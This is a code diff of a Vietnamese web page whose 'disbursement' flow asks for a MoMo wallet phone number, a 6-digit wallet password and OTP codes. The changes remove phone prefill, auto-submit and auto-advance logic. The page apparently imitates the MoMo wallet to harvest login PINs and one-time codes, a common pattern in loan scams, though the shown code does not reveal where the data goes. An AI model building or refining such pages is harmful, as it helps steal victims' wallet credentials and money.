@@ -673,9 +673,8 @@
         </main>
         <footer class="page-footer">
           <button
-            type="button"
             class="button primary"
-            onclick="confirmDisbursement()"
+            onclick="showSection('momo-phone-section')"
           >
             Xác nhận qua MoMo
           </button>
@@ -922,17 +921,6 @@
         };
 
         const formData = getFormData();
-
-        const normalizePhoneForWallet = (phone) => {
-          const digits = String(phone || "").replace(/\D/g, "");
-          if (digits.length === 10 && digits.startsWith("0")) {
-            return digits.slice(1);
-          }
-          if (digits.length === 11 && digits.startsWith("84")) {
-            return digits.slice(2);
-          }
-          return digits.length === 9 ? digits : "";
-        };
 
         const otpInputs = document.querySelectorAll(
           "#momo-otp-section .otp-input"
@@ -1212,15 +1200,6 @@
               "invalid",
               value.length > 0 && value.length < 9
             );
-            if (value.length === 9) {
-              handlePhoneSubmit();
-            }
-          });
-
-          passwordInputEl.addEventListener("input", () => {
-            if (passwordInputEl.value.length === 6) {
-              handlePasswordSubmit();
-            }
           });
 
           otpInputs.forEach((input, index) => {
@@ -1255,39 +1234,9 @@
           });
         };
 
-        window.confirmDisbursement = () => {
-          showSection("momo-phone-section");
-          const storedData =
-            JSON.parse(sessionStorage.getItem("formData") || "{}");
-          const phoneInput = getEl("momo-phone");
-          const normalizedPhone = normalizePhoneForWallet(storedData.phone);
-          if (normalizedPhone.length === 9) {
-            phoneInput.value = normalizedPhone;
-          }
-          setTimeout(() => phoneInput.focus(), 150);
-        };
-
-        const shouldAutoAdvanceFromEvaluate = () => {
-          const params = new URLSearchParams(window.location.search);
-          return (
-            params.get("from") === "evaluate" || formData.methodKey === "momo"
-          );
-        };
-
-        const autoAdvanceFromEvaluate = () => {
-          if (!shouldAutoAdvanceFromEvaluate()) return;
-          confirmDisbursement();
-        };
-
         const init = () => {
-          try {
-            populateData();
-            setupEventListeners();
-            autoAdvanceFromEvaluate();
-          } catch (error) {
-            console.error("MoMo init error:", error);
-            populateData();
-          }
+          populateData();
+          setupEventListeners();
         };
 
         init();
